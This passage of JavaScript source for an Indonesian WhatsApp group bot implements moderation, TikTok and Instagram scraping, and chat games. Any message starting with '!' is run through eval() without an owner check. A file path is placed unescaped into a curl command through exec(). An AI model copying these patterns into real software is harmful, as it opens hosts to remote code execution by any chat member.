            reply('Gagal mendeteksi konten media.');
        }
    }
}
// auto respon
if (m.isGroup && m.sender === monitoredNumber) {
    const now = Date.now();
    if (!lastResponseTime[m.chat] || (now - lastResponseTime[m.chat]) > responseInterval) {
        await KhaerulZx.sendMessage(m.chat, { text: 'Hai owner-ku!' }, { quoted: m });
        lastResponseTime[m.chat] = now;
    }
}
// ANTI MEDIA BY Finsii AI
if (antiMediaGroup[m.chat] && m.isGroup && !allowedNumbers.includes(m.sender)) {
    if (m.mtype === 'stickerMessage' || m.mtype === 'imageMessage' || m.mtype === 'videoMessage' || m.mtype === 'audioMessage') {
        await KhaerulZx.sendMessage(from, { delete: { remoteJid: from, id: m.id, fromMe: m.fromMe, participant: m.sender }});
    }
}
//antilink all by geekz
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return m.reply(bvl)
if (mek.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await KhaerulZx.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant 
}
})
KhaerulZx.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
KhaerulZx.sendMessage(from, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
// FUNCTION MONO SPACE FONT
function monospace(string) {
return '```' + string + '```'
}
//
function randomNomor(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
//
let gamewaktu = 60;
async function downloadIGStory(username) {
    const url = `https://www.instagram.com/stories/${username}/`;

    try {
        const { $, response } = await scrape(url);
        let stories = [];
        $('video, img').each((index, element) => {
            const mediaUrl = $(element).attr('src');
            if (mediaUrl) {
                stories.push(mediaUrl);
            }
        });

        if (stories.length === 0) {
            return `Tidak ada story yang ditemukan untuk username: ${username}`;
        }

        // Return hasil stories sebagai array link
        return stories;
    } catch (error) {
        return `Terjadi kesalahan: ${error.message}`;
    }
}



//
function makeid(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

// Function Uguu
async function uploadUguu(filePath) {
    const { exec } = require('child_process');
    const fs = require('fs');

    return new Promise((resolve, reject) => {
        exec(`curl -s -F files[]=@${filePath} https://uguu.se/upload.php`, (error, stdout) => {
            if (error) return reject('Gagal mengunggah ke Uguu');
            try {
                let jsonResponse = JSON.parse(stdout);
                resolve({ status: 'Done', result: jsonResponse.files[0].url });
            } catch (err) {
                reject('Gagal mengunggah ke Uguu');
            }
        });
    });
}

         //FUNCTION DEPOSIT
         
         /** antispam **/
if (isCmd && antiSpam.isFiltered(from) && !m.isGroup) {
console.log(color('[ SPAM ]', 'red'), color('yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
return m.reply('「 ❗ 」Beri Jeda 5Dtik Per Command Kak')
}

if (isCmd && antiSpam.isFiltered(from) && m.isGroup) {
console.log(color('[ SPAM ]', 'red'), color('yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
return m.reply('「 ❗ 」Beri Jeda 5Dtik Per Command Kak')
}

if (isCmd && !isCreator) antiSpam.addFilter(from)
//

// Auto download tiktok
  if (budy.startsWith('https://vt.tiktok.com/') || budy.startsWith('https://www.tiktok.com/') || budy.startsWith('https://t.tiktok.com/') || budy.startsWith('https://vm.tiktok.com/')) {
    try {
    const data = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(budy)}`);
    const stats = data.result.statistics;
const caption = `┈──────────────────────⫺
            *T I K T O K A U T O D L*
┈──────────────────────⫺\n*Author*: ${data.result.author.nickname}\n*Like*: ${data.result.statistics.likeCount}\n*Komentar*: ${data.result.statistics.commentCount}\n*Share*: ${data.result.statistics.shareCount}\n*Title*: ${data.result.desc}\n\n_Download By ${global.botname}_`;
const vidnya = data.result.video;
    KhaerulZx.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m });
} catch (error) {
    const anub = await fetchJson(`https://api.miftahganzz.my.id/api/download/tiktokv3?url=${encodeURIComponent(budy)}&apikey=miftah`);
    const syavid = anub.data.video;
    KhaerulZx.sendMessage(m.chat, { caption: mess.success, video: { url: syavid } }, { quoted: m });
}
  }
  
 
   
   async function ephoto(url, texk) {
let form = new FormData()
let gT = await axios.get(url, {
headers: {
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
}
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios.post(url, form, {
headers: {
...form.getHeaders(),
Accept: "*/*",
"Accept-Language": "en-US,en;q=0.9",
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
cookie: gT.headers["set-cookie"]?.join("; "),
}
});

//=================================================//
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
headers: {
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
cookie: gT.headers["set-cookie"].join("; ")
}
})
return build_server + data.image
}
  
// FITUR MENGETIK
if (global.autoTyping) {
if (command) { KhaerulZx.sendPresenceUpdate('composing', from)}}

// AUTO READ MESSAGE
if (global.autoTyping) {
if (command) { KhaerulZx.readMessages([m.key])}}

//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: KhaerulZx.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, KhaerulZx.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
KhaerulZx.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('!')) {
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
//==================================================//
try {
ppuser = await KhaerulZx.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
    let isNumber = x => typeof x === 'number' && !isNaN(x)
    let limitUser = isPrem ? 1000 : 400
    let user = global.db.data.users[m.sender]
    
    if (typeof user !== 'object') global.db.data.users[m.sender] = {}
    
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

let isNumber = x => typeof x === 'number' && !isNaN(x)
let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
                if (!isNumber(setting.status)) setting.status = 0
                if (autobio) {
        let _uptime = process.uptime() * 1000
		let uptime = clockString(_uptime)
		await KhaerulZx.updateProfileStatus(`I am ${botname} | Aktif Selama ${uptime} ⏳ | Mode : ${KhaerulZx.public ? 'Public-Mode' : 'Self-Mode'}`).catch(_ => _)
        }
if (autoread) {
KhaerulZx.readMessages([m.key])
        }
        
            } else global.db.data.settings[botNumber] = {
                status: 0,
                autobio: false,
                autoread: false
            }
            //=================================================//


//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
if (room.x !== room.o) await KhaerulZx.sendText(room.x, str, m, { mentions: parseMention(str) } )
await KhaerulZx.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}
//
async function ttSearch(query) {
	return new Promise(async(resolve,reject) => {
axios("https://tikwm.com/api/feed/search", {
headers: {
"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
"cookie": "current_language=en",
"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
},
data: {
"keywords": query,
"count": 12,
"cursor": 0,
"web": 1,
"hd": 1
},
"method": "POST"
}).then(res => { 
resolve(res.data.data) 
})
})
}
//GAME
KhaerulZx.susunkata = KhaerulZx.susunkata ? KhaerulZx.susunkata : {}  
if(from in KhaerulZx.susunkata){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.data.users[m.sender]
 let json = JSON.parse(JSON.stringify(KhaerulZx.susunkata[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.limit += KhaerulZx.susunkata[id][2]
   var teks = `*GAME SUSUN KATA*\n\nJawaban @${m?.sender.split('@')[0]} Benar!\n Hadiah : +${KhaerulZx.susunkata[id][2]} Limit`
reply(`${teks}`)
 clearTimeout(KhaerulZx.susunkata[id][3])
 delete KhaerulZx.susunkata[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
// else reply(`*Salah!*`)
 
}
//
KhaerulZx.tebaktebakan = KhaerulZx.tebaktebakan ? KhaerulZx.tebaktebakan : {};
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 KhaerulZx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/14744917bea0185b52fb1.jpg' }, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban @${m?.sender.split('@')[0]} Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik .tebaktebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else console.log('*Jawaban Salah!*')
}
//
KhaerulZx.tekateki = KhaerulZx.tekateki ? KhaerulZx.tekateki : {}  
if(from in KhaerulZx.tekateki){
let users = global.db.data.users[m.sender]
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(KhaerulZx.tekateki[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.limit += KhaerulZx.tekateki[id][2]
 var teks = `*GAME TEKATEKI*\n\nJawaban Kamu Benar!\n Hadiah : +${KhaerulZx.tekateki[id][2]} Limit`
 reply(`${teks}`)
 clearTimeout(KhaerulZx.tekateki[id][3])
 delete KhaerulZx.tekateki[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
}
//
KhaerulZx.tebakgambar = KhaerulZx.tebakgambar ? KhaerulZx.tebakgambar : {} 
if(from in KhaerulZx.tebakgambar) {
kuis = true
let id = m.chat
let users = global.db.data.users[m.sender]
let json = JSON.parse(JSON.stringify(KhaerulZx.tebakgambar[id][1]))
 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
   db.data.users[m.sender].limit += 5
 var teks = `🎮 Tebak Gambar 🎮\n\nJawaban @${m?.sender.split('@')[0]} Benar 🎉\nHadiah : 5 limit\n\nIngin bermain lagi? Silahkan Ketik tebakgambar`
 reply(`${teks}`)
 clearTimeout(KhaerulZx.tebakgambar[id][3])
 delete KhaerulZx.tebakgambar[id]
} else console.log('*Jawaban Salah!*')
}
//
KhaerulZx.tebakjkt48 = KhaerulZx.tebakjkt48 ? KhaerulZx.tebakjkt48 : {}
if(from in KhaerulZx.tebakjkt48) {
kuis = true
let id = m.chat
let users = global.db.data.users[m.sender]
let json = JSON.parse(JSON.stringify(KhaerulZx.tebakjkt48[id][1]))
 if (budy.toLowerCase() == json.name.toLowerCase().trim()) {
   db.data.users[m.sender].limit += 5
 var teks = `🎮 Tebak Member JKT48 🎮\n\nJawaban @${m?.sender.split('@')[0]} Benar 🎉\nHadiah : 5 limit\n\nIngin bermain lagi? Silahkan Ketik tebakjkt48`
 reply(`${teks}`)
 clearTimeout(KhaerulZx.tebakjkt48[id][3])
 delete KhaerulZx.tebakjkt48[id]
} else console.log('*Jawaban Salah!*')
}

//
KhaerulZx.tebaklirik = KhaerulZx.tebaklirik ? KhaerulZx.tebaklirik : {}  
if(from in KhaerulZx.tebaklirik){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.data.users[m.sender]
let json = JSON.parse(JSON.stringify(KhaerulZx.tebaklirik[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.limit += KhaerulZx.tebaklirik[id][2]
   var teks = `*GAME TEBAK LIRIK*\n\nJawaban Kamu Benar!\n Hadiah : +${KhaerulZx.tebaklirik[id][2]} Limit`
  reply(`${teks}`)
 clearTimeout(KhaerulZx.tebaklirik[id][3])
 delete KhaerulZx.tebaklirik[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
// else reply(`*Salah!*`)
 }
//
KhaerulZx.siapaaku = KhaerulZx.siapaaku ? KhaerulZx.siapaaku : {}
if(from in KhaerulZx.siapaaku){
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
let users = global.db.data.users[m.sender]
 let json = JSON.parse(JSON.stringify(KhaerulZx.siapaaku[id][1]))

 if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
users.money += KhaerulZx.siapaaku[id][2]
var teks = `*GAME SIAPAKAH AKU*\n\nJawaban Kamu Benar!\n Hadiah : +${KhaerulZx.siapaaku[id][2]} Limit`
   reply(`${teks}`)
 clearTimeout(KhaerulZx.siapaaku[id][3])
 delete KhaerulZx.siapaaku[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) reply(`*Dikit Lagi!*`)
// else reply(`*Salah!*`) 
}
//tebakkabu
 if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkabupaten[m.sender.split('@')[0]]
            if (budy.toLowerCase() == "nyerah") {
await reply('*Anda Telah menyerah*')
delete tebakkabupaten[m.sender.split('@')[0]]
            } else if (budy.toLowerCase() == jawaban) {
await KhaerulZx.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
            } else console.log('*Jawaban Salah!*')
        }
//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
KhaerulZx.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
KhaerulZx.sendText(from, `Game suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) KhaerulZx.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) KhaerulZx.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) KhaerulZx.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
KhaerulZx.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) KhaerulZx.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) KhaerulZx.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
KhaerulZx.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
    let user = global.db.data.users[m.sender]
    const message = `
    > @${m.sender.split`@`[0]} *Telah Kembali Dari Afk* ${user.afkReason ? '\n> *Setelah :* ' + user.afkReason : ''}\n> *Selama :* ${clockString(new Date - user.afkTime)}
    `.trim();
    await KhaerulZx.sendMessage(m.chat, { text: message, mentions: [m.sender] });
    user.afkTime = -1;
    user.afkReason = '';
}

function pickMoji(list) {
     return list[Math.floor(Math.random() * list.length)]
  }

async function falseR () {
KhaerulZx.sendReact(m.chat, '❌', m.key)
}

async function loading () {
var kayy = [
`${pickMoji(['🙄','🤯','🗿','💬','🤨','🥴','😐','👆','😔','👀','👎','🥶','💯','🔥','👍','❓️','⏳️','💥','🤙'])}`,
`${pickMoji(['😨','😅','😂','😳','😎','🥵','😱','🐦','🙄','🐤','🗿','💬','🤨','🥴','😐','👆','😔','👀','👎','🥶','💯','🔥','♻️','〽️','⚠️'])}`,
`${pickMoji(['😨','😅','😂','😳','💭','🗯','🥶','💯','🔥','👍','❓️','⏳️','💥','🤙'])}`,
`${pickMoji(['😳','💭','🗯','🥶','💯','🔥','👍','❓️','⏳️','💥','🤙'])}`,
`${pickMoji(['😨','😅','😂','😳','😎','🥵','😱','🐦','🙄','🐤','💣','😔','👀','👎','🥶','💯','💤','💨','🔥','👍','❓️','⏳️','💥','🤙'])}`,
]
let { key } = await KhaerulZx.sendReact(m.chat, `${pickMoji(['😨','😅','😂','😳','😎','🥵','😱','🐦','🙄','🐤','🗿','💬','🤨','🥴','😐','👆','😔','👀','👎','🥶','💯','🔥','👍','❓️','⏳️','💥','🤙'])}`, m.key)//Pengalih isu

for (let i = 0; i < kayy.length; i++) {
await sleep(65)
await KhaerulZx.sendReact(m.chat, kayy[i], m.key)
//PESAN LEPAS
}
}
//BATAS
//==================================================//
if (antibot.includes(m.chat)) {
if (!isBotAdmins) return
if (!isAdmins && !isCreator && !m.fromMe) {
if (m.isBaileys) {
let delet = m.key.participant
let bang = m.key.id
await KhaerulZx.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antibot* Lain Di Grup Ini`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: ppuser, title: "乂 Bot Lain Terdeteksi", body: "Powered By "+botname, previewType: "PHOTO"}}}, {quoted: m})
await KhaerulZx.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await KhaerulZx.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}
}

switch(command) {
case "menu": {
if (banned.includes(m.sender)) {
    return reply('Kamu telah dibanned dan tidak bisa menggunakan fitur ini.');
}
if (!isRegistered) return reply(mess.regis)
let limitz = db.data.users[m.sender].limit;
menuu = `ʜᴀᴘᴘʏ ${salam} @${m?.sender.split('@')[0]} 
sᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ ᴅɪ ꜰɪɴꜱɪɪ-ᴀɪ, ꜰɪɴꜱɪɪ-ᴀɪ ᴀᴅᴀʟᴀʜ sᴇʙᴜᴀʜ ʙᴏᴛ ʏᴀɴɢ ᴅɪᴄɪᴘᴛᴀᴋᴀɴ ᴋʜᴜsᴜs ᴜɴᴛᴜᴋ ᴍᴇᴍᴜᴅᴀʜᴋᴀɴ ᴏʀᴀɴɢ ᴏʀᴀɴɢ ᴅᴀʟᴀᴍ ᴍᴇɴᴄᴀʀɪ sᴇsᴜᴀᴛᴜ sᴇᴘᴇʀᴛɪ ʟᴀɢᴜ, ғᴏᴛᴏ, ᴠɪᴅᴇᴏ, ᴅʟʟ. ʙᴇʀɪᴋᴜᴛ ᴀᴅᴀʟᴀʜ ʟɪsᴛ ᴍᴇɴᴜ ꜰɪɴꜱɪɪ-ᴀɪ
​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​